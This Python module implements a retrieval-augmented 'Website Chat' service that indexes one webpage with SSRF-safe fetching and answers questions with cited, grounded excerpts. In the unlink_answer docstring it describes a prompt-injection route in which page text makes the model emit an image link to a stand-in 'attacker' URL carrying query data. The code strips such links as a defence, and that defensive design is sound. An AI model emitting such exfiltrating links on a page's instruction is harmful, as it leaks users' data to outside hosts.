"""Website Chat: index ONE webpage, then answer questions grounded in it.

Ingestion (no LLM calls, ever):
    normalize URL -> SSRF-safe fetch -> structured extraction -> cleaning ->
    content hash -> section-aware chunks -> embeddings -> atomic publish.
Each stage is written to the website's ``status`` so the UI shows real
progress. Work runs on the shared worker pool; the API returns at once.

Answering:
    question -> embeddings (question, plus question with the previous
    question for short follow-ups) -> website-scoped retrieval -> numbered
    excerpts -> LLM (conversation language, routed model) -> deterministic
    cleaning -> citations frozen with the exact passage text.

Refresh: content unchanged (same hash) reuses the index; changed content
builds a new index version that replaces the old one in one transaction.
Historical answers keep their frozen passages, so a citation never points at
an unrelated new passage.
"""

from __future__ import annotations

import dataclasses
import logging
import re
import threading
import time
from typing import Any

from src.agents.synthesizer import (
    REPORT_JSON_SCHEMA,
    extract_report_text,
    extract_valid_citations,
    strip_generated_reference_sections,
    strip_invalid_citations,
    strip_reasoning_artifacts,
)
from src.artifact_text import artifact_text
from src.config import AtlasConfig
from src.languages import language_instruction
from src.models.runs import utcnow
from src.models.websites import (
    AnswerStage,
    MessageRole,
    MessageStatus,
    WebsiteChunk,
    WebsiteCitation,
    WebsiteConversation,
    WebsiteMessage,
    WebsiteSource,
    WebsiteStatus,
)
from src.persistence.websites import WebsitesRepository
from src.prompts.website import (
    NOT_IN_PAGE,
    WEBSITE_CHAT_SYSTEM,
    WEBSITE_CHAT_USER,
    WEBSITE_HISTORY_BLOCK,
    WEBSITE_JSON_INSTRUCTION,
    WEBSITE_LENGTH_BROAD,
    WEBSITE_LENGTH_FOCUSED,
    WEBSITE_NUMBERS_RETRY_NOTE,
    WEBSITE_RETRY_NOTE,
)
from src.scientific_text import PLAIN_NOTATION_RETRY_NOTE, plain_notation, scientific_text_issues
from src.website import errors
from src.website.chunking import chunk_blocks, estimate_tokens
from src.website.context import focus_excerpt, plan_for, question_terms, select_passages
from src.website.errors import WebsiteError, WebsiteNotFoundError, WebsiteStateError
from src.website.extract import decode_body, extract_page
from src.website.grounding import evidence_numbers, ungrounded_numbers
from src.website.fetch import FetchLimits, SafeWebsiteFetcher, check_hostname, is_public_address
from src.website.retrieval import TOP_K, document_text, retrieve
from src.website.urls import display_domain, normalize_url

logger = logging.getLogger(__name__)

EMBED_BATCH = 16
_PAGE_BRACKET_NUMBER_RE = re.compile(r"\[(\d{1,4})\]")
MAX_QUESTION_CHARS = 2000
HISTORY_TURNS = 2
#: Website Chat's own answer deadline (whole request, every attempt included).
#: It is a ceiling: configuration can only lower it. Research budgets are separate.
MAX_ANSWER_SECONDS = 360
MAX_ANSWER_ATTEMPTS = 2
#: A retry starts only with at least this much of the deadline left.
MIN_RETRY_SECONDS = 60
ANSWER_TIMEOUT_MESSAGE = "This answer took too long to generate. Try asking a more specific question."
_RETRY_NOTES = {
    "notation": PLAIN_NOTATION_RETRY_NOTE,
    "uncited": WEBSITE_RETRY_NOTE,
    "ungrounded_numbers": WEBSITE_NUMBERS_RETRY_NOTE,
}


def answer_deadline_seconds(config: AtlasConfig) -> int:
    configured = config.website_chat_timeout_seconds or MAX_ANSWER_SECONDS
    return max(1, min(configured, MAX_ANSWER_SECONDS))
_MD_IMAGE_RE = re.compile(r"!\[([^\]]*)\]\([^)]*\)")
_MD_LINK_RE = re.compile(r"\[([^\]]+)\]\([^)]*\)")
_AUTOLINK_RE = re.compile(r"<((?:https?|ftp|mailto):[^>\s]*)>", re.IGNORECASE)


def _ollama_timings(response: Any, wall_ms: int) -> dict[str, Any]:
    """Per-call timings Ollama reports (absent for test doubles)."""
    meta = getattr(response, "response_metadata", None) or {}
    ms = lambda key: int((meta.get(key) or 0) / 1e6)  # noqa: E731  (nanoseconds)
    return {
        "wall_ms": wall_ms,
        "load_ms": ms("load_duration"),
        "prompt_tokens": meta.get("prompt_eval_count"),
        "prompt_eval_ms": ms("prompt_eval_duration"),
        "output_tokens": meta.get("eval_count"),
        "generation_ms": ms("eval_duration"),
    }


def unlink_answer(text: str) -> str:
    """Answers are plain cited prose: no images, no links.

    A page can try to make the model emit ``![](https://attacker/?q=...)``; the
    browser would fetch that URL when rendering the answer. Images become
    their alt text and links their text, so nothing in an answer loads or
    navigates anywhere. The page itself is opened only from the guarded
    "Open original page" link.
    """
    text = _MD_IMAGE_RE.sub(lambda m: m.group(1), text)
    # "[2](url)" stays the citation "[2]"; any other link keeps only its text.
    text = _MD_LINK_RE.sub(lambda m: f"[{m.group(1)}]" if m.group(1).isdigit() else m.group(1), text)
    return _AUTOLINK_RE.sub(lambda m: m.group(1), text)


def _ip_literal(host: str) -> bool:
    import ipaddress

    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        return False


class WebsiteChatService:
    def __init__(
        self,
        config: AtlasConfig,
        repo: WebsitesRepository,
        *,
        embed_fn,
        llm_factory,
        executor,
        languages,
        fetcher: SafeWebsiteFetcher | None = None,
    ) -> None:
        self._config = config
        self._repo = repo
        self._embed = embed_fn
        self._llm_factory = llm_factory
        self._executor = executor
        self._languages = languages
        self._fetcher = fetcher or SafeWebsiteFetcher(
            FetchLimits(max_bytes=config.website_max_bytes)
        )
        self._prefixed = "nomic" in (config.embedding_model or "").lower()
        self._lock = threading.Lock()
        self._cancelled: set[str] = set()
        self._active_sites: set[str] = set()
        self._scopes: dict[str, Any] = {}

    # -- websites --------------------------------------------------------------

    def submit(self, url: str) -> tuple[WebsiteSource, bool]:
        """Index ``url``; an already indexed URL is returned, not re-indexed.

        Returns ``(website, created)``. Obvious local targets are refused
        synchronously; DNS-based checks run (again, per hop) in the fetch.
        """
        normalized = normalize_url(url)
        from urllib.parse import urlsplit

        host = urlsplit(normalized).hostname or ""
        check_hostname(host)
        if _ip_literal(host) and not is_public_address(host):
            raise WebsiteError(
                errors.BLOCKED_ADDRESS,
                "The address is private, local or reserved and cannot be fetched.",
            )
        existing = self._repo.get_by_normalized_url(normalized)
        if existing is not None:
            if existing.status in (WebsiteStatus.FAILED, WebsiteStatus.CANCELLED) and not existing.is_indexed:
                existing.submitted_url = url.strip()
                self._start(existing, refresh=False)
            return self._repo.get(existing.id) or existing, False
        site = WebsiteSource(
            submitted_url=url.strip(), normalized_url=normalized, domain=display_domain(normalized)
        )
        stored = self._repo.insert(site)
        if stored.id != site.id:  # lost a race with an identical submission
            return stored, False
        self._start(site, refresh=False)
        return self._repo.get(site.id) or site, True

    def _start(self, site: WebsiteSource, refresh: bool) -> None:
        with self._lock:
            if site.id in self._active_sites:
                raise WebsiteStateError(errors.BUSY, "This page is already being indexed.")
            self._active_sites.add(site.id)
            self._cancelled.discard(site.id)
        site.status = WebsiteStatus.PENDING
        site.updated_at = utcnow()
        self._repo.update(site)
        self._executor.submit(self._ingest, site.id, refresh)

    def get(self, website_id: str) -> WebsiteSource:
        site = self._repo.get(website_id)
        if site is None:
            raise WebsiteNotFoundError()
        return site

    def list(self) -> list[WebsiteSource]:
        return self._repo.list()

    def refresh(self, website_id: str) -> WebsiteSource:
        site = self.get(website_id)
        if site.status.is_active:
            raise WebsiteStateError(errors.BUSY, "This page is already being indexed.")
        self._start(site, refresh=site.is_indexed)
        return self.get(website_id)

    def cancel(self, website_id: str) -> WebsiteSource:
        site = self.get(website_id)
        if not site.status.is_active:
            raise WebsiteStateError(errors.NOT_READY, "Nothing is being indexed for this page.")
        with self._lock:
            self._cancelled.add(website_id)
        return site

    def delete(self, website_id: str) -> None:
        with self._lock:
            self._cancelled.add(website_id)
        if not self._repo.delete(website_id):
            raise WebsiteNotFoundError()
        logger.info("Website %s deleted with its chunks and conversations.", website_id)

    def recover_interrupted(self) -> int:
        """Close out ingestion and answers whose worker died with the server."""
        recovered = 0
        for site in self._repo.list_active():
            with self._lock:
                if site.id in self._active_sites:
                    continue
            site.status = WebsiteStatus.READY if site.is_indexed else WebsiteStatus.FAILED
            site.error_code = errors.INTERRUPTED
            site.error = (
                "Interrupted: the Atlas server stopped while this page was being refreshed; "
                "the previous index is unchanged."
                if site.is_indexed
                else "Interrupted: the Atlas server stopped while this page was being indexed."
            )
            site.updated_at = utcnow()
            self._repo.update(site)
            recovered += 1
        for message in self._repo.list_pending_messages():
            message.status = MessageStatus.FAILED
            message.stage = AnswerStage.QUEUED
            message.error_code = errors.INTERRUPTED
            message.error = "Interrupted: the Atlas server stopped while this answer was being written."
            message.completed_at = utcnow()
            self._repo.update_message(message)
            recovered += 1
        if recovered:
            logger.warning("Closed out %d interrupted Website Chat job(s).", recovered)
        return recovered

    # -- ingestion -------------------------------------------------------------

    def _set_status(self, site: WebsiteSource, status: WebsiteStatus) -> None:
        self._check_cancel(site)
        site.status = status
        site.updated_at = utcnow()
        if not self._repo.update(site):
            raise _Deleted()

    def _check_cancel(self, site: WebsiteSource) -> None:
        if site.id in self._cancelled:
            raise WebsiteError(errors.CANCELLED, "Indexing was cancelled.")

    def _ingest(self, website_id: str, refresh: bool) -> None:
        site = self._repo.get(website_id)
        if site is None:
            self._release(website_id)
            return
        timings: dict[str, Any] = {}
        started = time.perf_counter()
        try:
            self._set_status(site, WebsiteStatus.FETCHING)
            t = time.perf_counter()
            fetched = self._fetcher.fetch(
                site.normalized_url, should_cancel=lambda: website_id in self._cancelled
            )
            timings["fetch_ms"] = int((time.perf_counter() - t) * 1000)
            timings["http_status"] = fetched.status_code
            timings["bytes"] = len(fetched.body)
            timings["redirects"] = fetched.redirects

            self._set_status(site, WebsiteStatus.EXTRACTING)
            t = time.perf_counter()
            html = decode_body(fetched.body, fetched.charset)
            page = extract_page(html, is_html=fetched.is_html)
            timings["extract_ms"] = int((time.perf_counter() - t) * 1000)
            timings.update(page.timings)
            site.final_url = fetched.final_url
            site.domain = display_domain(fetched.final_url)
            site.page_title = page.title or site.domain
            site.content_language = page.language
            site.fetched_at = utcnow()

            if refresh and site.is_indexed and page.content_hash == site.content_hash:
                timings["refresh_outcome"] = "unchanged"
                timings["total_ms"] = int((time.perf_counter() - started) * 1000)
                timings["llm_calls"] = 0
                # Nothing was chunked or embedded this time.
                timings.update(chunk_ms=0, embed_ms=0, persist_ms=0)
                timings.update(chunks=site.chunk_count, words=site.word_count)
                site.metrics = timings
                site.error, site.error_code = "", ""
                self._set_status(site, WebsiteStatus.READY)
                logger.info("Website %s refreshed: content unchanged; index reused.", website_id)
                return

            self._set_status(site, WebsiteStatus.CHUNKING)
            t = time.perf_counter()
            drafts = chunk_blocks(page.blocks)
            timings["chunk_ms"] = int((time.perf_counter() - t) * 1000)
            if not drafts:
                raise WebsiteError(errors.EMPTY_CONTENT, "No meaningful text was found on this page.")
            if len(drafts) > self._config.website_max_chunks:
                raise WebsiteError(
                    errors.TOO_LONG,
                    f"This page is too long to index ({len(drafts)} sections; the limit is "
                    f"{self._config.website_max_chunks}).",
                )

            self._set_status(site, WebsiteStatus.EMBEDDING)
            t = time.perf_counter()
            texts = [document_text(site, d.section_title, d.text, self._prefixed) for d in drafts]
            vectors: list[list[float]] = []
            try:
                for i in range(0, len(texts), EMBED_BATCH):
                    self._check_cancel(site)
                    vectors.extend(self._embed(texts[i : i + EMBED_BATCH]))
            except WebsiteError:
                raise
            except Exception as exc:
                logger.warning("Website %s embedding failed: %s", website_id, type(exc).__name__)
                raise WebsiteError(
                    errors.EMBEDDING_FAILED,
                    "The local embedding model could not process this page. Check that Ollama is running.",
                ) from exc
            timings["embed_ms"] = int((time.perf_counter() - t) * 1000)
            self._check_cancel(site)

            t = time.perf_counter()
            version = site.index_version + 1
            chunks = [
                WebsiteChunk(
                    website_id=site.id,
                    index_version=version,
                    chunk_index=d.chunk_index,
                    section_title=d.section_title,
                    heading_path=d.heading_path,
                    text=d.text,
                    char_start=d.char_start,
                    char_end=d.char_end,
                )
                for d in drafts
            ]
            timings["refresh_outcome"] = "changed" if refresh else "new"
            timings["llm_calls"] = 0
            timings["chunks"] = len(chunks)
            timings["words"] = page.word_count
            site.index_version = version
            site.content_hash = page.content_hash
            site.word_count = page.word_count
            site.chunk_count = len(chunks)
            site.indexed_at = utcnow()
            site.status = WebsiteStatus.READY
            site.error, site.error_code = "", ""
            site.updated_at = utcnow()
            timings["persist_ms"] = 0
            timings["total_ms"] = int((time.perf_counter() - started) * 1000)
            site.metrics = timings
            if not self._repo.replace_index(site, chunks, vectors):
                raise _Deleted()
            timings["persist_ms"] = int((time.perf_counter() - t) * 1000)
            site.metrics = timings
            self._repo.update(site)
            logger.info(
                "Website %s indexed: %s, %d words, %d chunks; fetch %s ms, extract %s ms, "
                "chunk %s ms, embed %s ms, total %s ms; 0 LLM calls.",
                website_id, site.final_url, site.word_count, site.chunk_count,
                timings.get("fetch_ms"), timings.get("extract_ms"), timings.get("chunk_ms"),
                timings.get("embed_ms"), timings.get("total_ms"),
            )
        except _Deleted:
            logger.info("Website %s was deleted during indexing; stopping.", website_id)
        except WebsiteError as exc:
            self._fail(website_id, exc.code, exc.message, timings, started)
        except Exception:
            logger.exception("Website %s indexing failed unexpectedly.", website_id)
            self._fail(
                website_id, errors.PROCESSING_FAILED, "Atlas could not process this page.", timings, started
            )
        finally:
            self._release(website_id)

    def _fail(self, website_id: str, code: str, message: str, timings: dict, started: float) -> None:
        site = self._repo.get(website_id)
        if site is None:
            return
        timings["total_ms"] = int((time.perf_counter() - started) * 1000)
        if site.is_indexed:
            # A failed refresh never touches the published index.
            site.status = WebsiteStatus.READY
            timings["refresh_outcome"] = "failed"
        else:
            site.status = WebsiteStatus.CANCELLED if code == errors.CANCELLED else WebsiteStatus.FAILED
        site.error, site.error_code = message, code
        site.metrics = {**site.metrics, **timings}
        site.updated_at = utcnow()
        self._repo.update(site)
        logger.info("Website %s: %s (%s).", website_id, code, message)

    def _release(self, website_id: str) -> None:
        with self._lock:
            self._active_sites.discard(website_id)
            self._cancelled.discard(website_id)

    # -- conversations -----------------------------------------------------------

    def create_conversation(self, website_id: str, output_language: str | None) -> WebsiteConversation:
        site = self.get(website_id)
        if not site.is_indexed:
            raise WebsiteStateError(errors.NOT_READY, "This page has not been indexed yet.")
        language = self._languages.require(output_language or "en", "website_chat")
        conversation = WebsiteConversation(website_id=site.id, output_language=language)
        self._repo.save_conversation(conversation)
        return conversation

    def list_conversations(self, website_id: str) -> list[WebsiteConversation]:
        self.get(website_id)
        return self._repo.list_conversations(website_id)

    def get_conversation(self, conversation_id: str) -> tuple[WebsiteConversation, list[WebsiteMessage]]:
        conversation = self._repo.get_conversation(conversation_id)
        if conversation is None:
            raise WebsiteNotFoundError("Conversation")
        return conversation, self._repo.list_messages(conversation_id)

    def delete_conversation(self, conversation_id: str) -> None:
        if not self._repo.delete_conversation(conversation_id):
            raise WebsiteNotFoundError("Conversation")

    def ask(self, conversation_id: str, question: str) -> tuple[WebsiteMessage, WebsiteMessage]:
        question = (question or "").strip()
        if not question:
            raise WebsiteError(errors.EMPTY_QUESTION, "Ask a question about the page.")
        if len(question) > MAX_QUESTION_CHARS:
            raise WebsiteError(
                errors.QUESTION_TOO_LONG, f"Questions are limited to {MAX_QUESTION_CHARS} characters."
            )
        conversation, messages = self.get_conversation(conversation_id)
        site = self.get(conversation.website_id)
        if not site.is_indexed:
            raise WebsiteStateError(errors.NOT_READY, "This page has not been indexed yet.")
        if any(m.status is MessageStatus.PENDING for m in messages):
            raise WebsiteStateError(errors.BUSY, "Atlas is still answering the previous question.")
        # The conversation's language is authoritative; refuse rather than
        # answer in another language if it can no longer be generated.
        language = self._languages.require(conversation.output_language, "website_chat")
        user = self._repo.add_message(
            WebsiteMessage(
                conversation_id=conversation_id, role=MessageRole.USER, content=question,
                output_language=language,
            )
        )
        if not conversation.title:
            conversation.title = question[:120]
            conversation.updated_at = utcnow()
            self._repo.save_conversation(conversation)
        answer = self._repo.add_message(
            WebsiteMessage(
                conversation_id=conversation_id, role=MessageRole.ASSISTANT,
                status=MessageStatus.PENDING, output_language=language,
            )
        )
        self._executor.submit(self._answer, answer.id)
        return user, answer

    def cancel_message(self, message_id: str) -> WebsiteMessage:
        message = self._repo.get_message(message_id)
        if message is None:
            raise WebsiteNotFoundError("Message")
        if message.status is not MessageStatus.PENDING:
            raise WebsiteStateError(errors.NOT_READY, "This answer has already finished.")
        with self._lock:
            self._cancelled.add(message_id)
            scope = self._scopes.get(message_id)
        if scope is not None:
            scope.cancel()
        return message

    # -- answering -----------------------------------------------------------------

    def _writing_config(self, language: str) -> AtlasConfig:
        model = self._languages.model_for(language)
        return self._config if model == self._config.model else dataclasses.replace(self._config, model=model)

    @staticmethod
    def _excerpts(items, texts: list[str] | None = None) -> str:
        """Delimited excerpt blocks; ``texts`` are the (possibly focused) model inputs."""
        blocks = []
        for number, item in enumerate(items, 1):
            # Delimiters cannot be forged by page text, and the page's own
            # bracketed numbers ("...efficiency.[3]") must not read as Atlas
            # excerpt citations. Model input only: the stored passage shown
            # in the evidence drawer is unchanged.
            raw = texts[number - 1] if texts is not None else item.chunk.text
            text = raw.replace("<<<", "‹‹‹").replace(">>>", "›››")
            text = _PAGE_BRACKET_NUMBER_RE.sub(r"(ref. \1)", text)
            section = item.chunk.section_title.replace("<<<", "‹‹‹").replace(">>>", "›››")
            blocks.append(
                f"<<<EXCERPT [{number}] section: {section or '-'}>>>\n{text}\n<<<END EXCERPT [{number}]>>>"
            )
        return "\n\n".join(blocks)

    def _history(self, messages: list[WebsiteMessage], current_seq: int) -> tuple[str, str]:
        """(history block, previous user question) from earlier turns.

        Only the user's earlier QUESTIONS are given to the model: they are what
        resolves "it" / "that one". Earlier answers are deliberately left out.
        They are not evidence, and a small model imitates them: an answer
        replayed without its citation markers (or an earlier "not in this
        page" reply) taught qwen3:4b to answer uncited, which the grounding
        gate then rejected as unsupported (live acceptance, two false
        "insufficient" replies).
        """
        questions = [
            m.content for m in messages if m.role is MessageRole.USER and m.seq < current_seq - 1
        ]
        recent = questions[-HISTORY_TURNS:]
        previous_question = questions[-1] if questions else ""
        turns = "\n".join(f"- {q}" for q in recent)
        block = WEBSITE_HISTORY_BLOCK.format(turns=turns) if recent else ""
        return block, previous_question

    def _set_stage(self, message_id: str, stage: AnswerStage) -> None:
        """Persist the current real step of a PENDING answer (survives a page refresh)."""
        message = self._repo.get_message(message_id)
        if message is not None and message.status is MessageStatus.PENDING and message.stage is not stage:
            message.stage = stage
            self._repo.update_message(message)

    def _check_answer_cancel(self, message_id: str) -> None:
        from src.cancellation import RunCancelledError

        if message_id in self._cancelled:
            raise RunCancelledError("The answer was cancelled.")

    def _answer(self, message_id: str) -> None:
        from src.cancellation import CancelScope, RunCancelledError, StageTimeoutError, awake_clock
        from src.llm import AbortableLLM, make_llm

        started = time.perf_counter()
        message = self._repo.get_message(message_id)
        if message is None:
            return
        scope = CancelScope()
        with self._lock:
            self._scopes[message_id] = scope
        # ONE deadline for the whole request: retrieval, every generation
        # attempt and validation. A retry only gets what is left.
        budget = answer_deadline_seconds(self._config)
        deadline_at = awake_clock() + budget
        metrics: dict[str, Any] = {"deadline_s": budget}
        try:
            conversation, messages = self.get_conversation(message.conversation_id)
            site = self.get(conversation.website_id)
            question = next(
                m.content for m in reversed(messages) if m.role is MessageRole.USER and m.seq < message.seq
            )
            history, previous_question = self._history(messages, message.seq)
            self._set_stage(message_id, AnswerStage.RETRIEVING)
            result = retrieve(
                self._repo, site, question, self._embed,
                previous_question=previous_question, top_k=TOP_K, prefixed=self._prefixed,
            )
            self._check_answer_cancel(message_id)
            plan = plan_for(question)
            items = select_passages(result.items, plan)
            terms = question_terms(question, previous_question)
            texts = [focus_excerpt(i.chunk.text, terms, plan.excerpt_tokens) for i in items]
            metrics.update(
                retrieval_ms=result.elapsed_ms,
                queries=result.queries,
                plan=plan.as_metrics(),
                retrieved=[
                    {
                        "chunk_id": i.chunk.id, "chunk_index": i.chunk.chunk_index,
                        "section": i.chunk.section_title, "score": round(i.score, 4),
                        "cosine": round(i.cosine, 4), "lexical": round(i.lexical, 3),
                        "used": i in items,
                    }
                    for i in result.items
                ],
            )
            # Citations open the FULL stored passage; the model saw a verbatim
            # subset of it (``texts``), never anything that is not in it.
            citations = [
                WebsiteCitation(
                    index=n, chunk_id=i.chunk.id, index_version=i.chunk.index_version,
                    chunk_index=i.chunk.chunk_index, section_title=i.chunk.section_title,
                    heading_path=i.chunk.heading_path, text=i.chunk.text, score=round(i.score, 4),
                    url=site.final_url or site.normalized_url, page_title=site.page_title,
                )
                for n, i in enumerate(items, 1)
            ]
            language = conversation.output_language
            config = self._writing_config(language)
            config = dataclasses.replace(
                config, website_chat_max_tokens=min(plan.max_tokens, config.website_chat_max_tokens)
            )
            metrics["model"] = config.model
            llm = AbortableLLM(
                lambda: make_llm(self._llm_factory, config, reasoning=False, stage="website_chat"),
                timeout=None,
                run_deadline=lambda: deadline_at,
                scope=scope,
                label="website chat",
            )
            t_prompt = time.perf_counter()
            system = WEBSITE_CHAT_SYSTEM + language_instruction(language)
            user = WEBSITE_CHAT_USER.format(
                title=site.page_title, excerpts=self._excerpts(items, texts), history=history,
                question=question, length=WEBSITE_LENGTH_BROAD if plan.broad else WEBSITE_LENGTH_FOCUSED,
            ) + WEBSITE_JSON_INSTRUCTION
            metrics.update(
                prompt_ms=int((time.perf_counter() - t_prompt) * 1000),
                prompt_chars=len(system) + len(user),
                passages=len(items),
                excerpt_tokens=sum(estimate_tokens(t) for t in texts),
                passage_tokens=sum(estimate_tokens(i.chunk.text) for i in items),
            )
            # Figures may come only from what the model was shown.
            evidence = evidence_numbers(
                site.page_title or "", question,
                *(f"{i.chunk.section_title}\n{text}" for i, text in zip(items, texts)),
            )
            body, cited, insufficient, attempts = "", set(), not items, 0
            rejected: list[str] = []
            calls: list[dict[str, Any]] = []
            # Recorded as they happen, so a timed-out or failed answer keeps them too.
            metrics.update(calls=calls, rejected=rejected)
            validation_ms = 0
            note = ""
            while items and attempts < MAX_ANSWER_ATTEMPTS:
                if attempts and deadline_at - awake_clock() < MIN_RETRY_SECONDS:
                    # No time for a fair second attempt: an ungrounded first
                    # answer is never shown, and the user is told why.
                    raise WebsiteError(errors.ANSWER_TIMEOUT, ANSWER_TIMEOUT_MESSAGE)
                attempts += 1
                self._check_answer_cancel(message_id)
                self._set_stage(message_id, AnswerStage.GENERATING)
                t = time.perf_counter()
                response = llm.invoke(
                    [("system", system), ("user", user + note)], format=REPORT_JSON_SCHEMA
                )
                calls.append(_ollama_timings(response, int((time.perf_counter() - t) * 1000)))
                self._set_stage(message_id, AnswerStage.VALIDATING)
                t_validate = time.perf_counter()
                verdict, text, cited = self._judge(str(getattr(response, "content", response)), len(items), evidence)
                validation_ms += int((time.perf_counter() - t_validate) * 1000)
                if verdict == "insufficient":
                    insufficient = True
                    break
                if verdict == "ok":
                    body, insufficient = text, False
                    break
                rejected.append(verdict)
                note = _RETRY_NOTES[verdict]
                body = ""
                # A missing citation or unsupported figure means "not grounded";
                # a notation problem alone is a formatting failure.
                if verdict != "notation":
                    insufficient = True
            metrics.update(
                llm_ms=sum(c["wall_ms"] for c in calls), attempts=attempts, rejected=rejected,
                calls=calls, validation_ms=validation_ms,
            )
            if not body and not insufficient:
                raise WebsiteError(
                    errors.UNUSABLE_ANSWER, "The model's answer could not be used (corrupted formatting)."
                )
            message = self._repo.get_message(message_id) or message
            if insufficient:
                message.content = artifact_text(language, "website.insufficient")
                message.insufficient_evidence = True
                message.citations = []
                message.cited = []
            else:
                message.content = body
                message.citations = citations
                message.cited = sorted(cited)
            message.status = MessageStatus.COMPLETED
            message.stage = AnswerStage.QUEUED
            metrics["total_ms"] = int((time.perf_counter() - started) * 1000)
            message.metrics = metrics
            message.completed_at = utcnow()
            self._repo.update_message(message)
            logger.info(
                "Website answer %s (%s, %s): retrieval %s ms, LLM %s ms, %d attempt(s), cited %s%s.",
                message_id, language, config.model, metrics.get("retrieval_ms"), metrics["llm_ms"], attempts,
                message.cited, ", insufficient evidence" if insufficient else "",
            )
        except Exception as exc:
            message = self._repo.get_message(message_id) or message
            cancelled = isinstance(exc, RunCancelledError) or message_id in self._cancelled
            if cancelled:
                code, text = errors.CANCELLED, "The answer was cancelled."
            elif isinstance(exc, WebsiteError):
                code, text = exc.code, exc.message
            else:
                from src.llm import is_llm_timeout

                if isinstance(exc, StageTimeoutError) or is_llm_timeout(exc):
                    code, text = errors.ANSWER_TIMEOUT, ANSWER_TIMEOUT_MESSAGE
                else:
                    logger.exception("Website answer %s failed.", message_id)
                    code, text = errors.LLM_FAILED, "The local model could not answer. Check that Ollama is running."
            if metrics.get("calls"):
                metrics["llm_ms"] = sum(c["wall_ms"] for c in metrics["calls"])
            message.status = MessageStatus.CANCELLED if cancelled else MessageStatus.FAILED
            message.stage = AnswerStage.QUEUED
            message.error_code, message.error = code, text
            message.content = ""  # never a partial or ungrounded answer
            metrics["total_ms"] = int((time.perf_counter() - started) * 1000)
            message.metrics = metrics
            message.completed_at = utcnow()
            self._repo.update_message(message)
        finally:
            with self._lock:
                self._scopes.pop(message_id, None)
                self._cancelled.discard(message_id)

    @staticmethod
    def _judge(raw: str, n_items: int, evidence: set[str]) -> tuple[str, str, set[int]]:
        """("ok" | "insufficient" | a rejection reason, cleaned text, cited numbers)."""
        text = extract_report_text(raw)
        text = strip_reasoning_artifacts(text)
        text = strip_generated_reference_sections(text)
        text = strip_invalid_citations(text, n_items)
        text = unlink_answer(plain_notation(text)).strip()
        if text.strip(" .\"'`*") == NOT_IN_PAGE or not text:
            return "insufficient", "", set()
        text = text.replace(NOT_IN_PAGE, "").strip()
        if scientific_text_issues(text):
            return "notation", text, set()
        cited = extract_valid_citations(text, n_items)
        if not cited:
            # Uncited prose is not grounded: never shown as an answer.
            return "uncited", text, set()
        if ungrounded_numbers(text, evidence):
            # A cited sentence whose figures are in no excerpt is not grounded either.
            return "ungrounded_numbers", text, set()
        return "ok", text, cited

class _Deleted(Exception):
    """The website row disappeared while a worker was using it."""
